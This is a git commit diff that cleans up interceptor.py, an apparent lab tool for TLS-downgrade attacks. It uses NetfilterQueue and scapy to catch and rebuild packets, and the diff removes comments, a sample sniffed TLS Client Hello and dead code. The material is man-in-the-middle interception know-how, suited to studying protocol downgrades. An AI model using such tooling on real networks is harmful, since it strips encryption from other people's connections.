550f76ef4c1827b79d638b36a004074494e7fba8
Tess Sluijter <tsluyter@kilala.nl>
2020-10-11 16:45:49 +0200

    Cleanup now that the downgrade works.

--- TLS-downgrade/interceptor.py
+++ TLS-downgrade/interceptor.py
@@ -2,8 +2,6 @@
 #
 # With many thanks to Ludovic Barman for their great write-up.
 # https://lbarman.ch/blog/downgrade-tls/
-# This one thread on a Python forum was also helpful:
-# https://python-forum.io/Thread-NetfilterQueue-set-payload
 #
 # Also, thanks to Mike D. for teaching me how to join() to fix
 # the bytes for set_payload().
@@ -47,26 +45,13 @@ def processPacket(packet):
         print("After re-creating it:")
         print(scapy_packet.command())
 
-#        try:
-#          scapy_packet = craftTLS(scapy_packet)
-#          packet.set_payload(bytes.scapy_packet)
-#        except:
-#          print("Something failed")
-#          packet.accept()   
-
       packet.accept()   
     
     else:                                                                              
       packet.accept();
 
 
-def craftTLS(scapy_packet):
-  # Format from one sniffed TLS Client Hello:
-  #
-  #IP(frag=0, src='172.17.0.1', proto=6, tos=0, dst='172.17.0.2', chksum=54109, len=188, id=3769, version=4, flags=2, ihl=5, ttl=64)/TCP(reserved=0, seq=1466102824, ack=261469783, dataofs=8, urgptr=0, window=229, flags=24, chksum=10644, dport=5000, sport=48864, options=[('NOP', None), ('NOP', None), ('Timestamp', (448231364, 592815232))])/Raw(load='\x16\x03\x01\x00\x83\x01\x00\x00\x7f\x03\x03 \x10k\x979\xbb\r\x05\xe7p\x06"\x11\xf0Yy}R\xc9vx\xcb\x08\xa5\x0f=\x1a?\x91\xc0\x84\x80\x00\x00\x04\xc0\x14\x00\xff\x01\x00\x00R\x00\x0b\x00\x04\x03\x00\x01\x02\x00\n\x00\x0c\x00\n\x00\x1d\x00\x17\x00\x1e\x00\x19\x00\x18\x00#\x00\x00\x00\x16\x00\x00\x00\x17\x00\x00\x00\r\x00*\x00(\x04\x03\x05\x03\x06\x03\x08\x07\x08\x08\x08\t\x08\n\x08\x0b\x08\x04\x08\x05\x08\x06\x04\x01\x05\x01\x06\x01\x03\x03\x03\x01\x03\x02\x04\x02\x05\x02\x06\x02')
-
-  #print(scapy_packet.show2())
-  
+def craftTLS(scapy_packet):  
   IP_src = scapy_packet["IP"].src
   IP_dst = scapy_packet["IP"].dst
 
@@ -88,8 +73,6 @@ def craftTLS(scapy_packet):
   TCP_ack = scapy_packet["TCP"].ack    
   TCP_flags = scapy_packet["TCP"].flags
   
-  #ip=IP(src=IP_src, dst=IP_dst)
-  #tcp=TCP(sport=TCP_sport, dport=TCP_dport, options=TCP_options)
   ip=IP(frag=IP_frag, src=IP_src, proto=IP_proto, tos=IP_tos, dst=IP_dst, id=IP_id, version=IP_version, flags=IP_flags, ttl=IP_ttl, ihl=IP_ihl)
   tcp=TCP(reserved=TCP_reserved, seq=TCP_seq, ack=TCP_ack, flags=TCP_flags, dport=TCP_dport, sport=TCP_sport, options=TCP_options )  
   
@@ -105,10 +88,6 @@ def craftTLS(scapy_packet):
   RAW_load = b''.join(RAW_bytes) 
   
   packet = ip/tcp/RAW_load
-  
-  # Sending out the DIY packet
-  # Hang on, no, that'll get us stuck in an endless loop. It needs to be accepted.
-  #send(packet)
   return packet
 
 
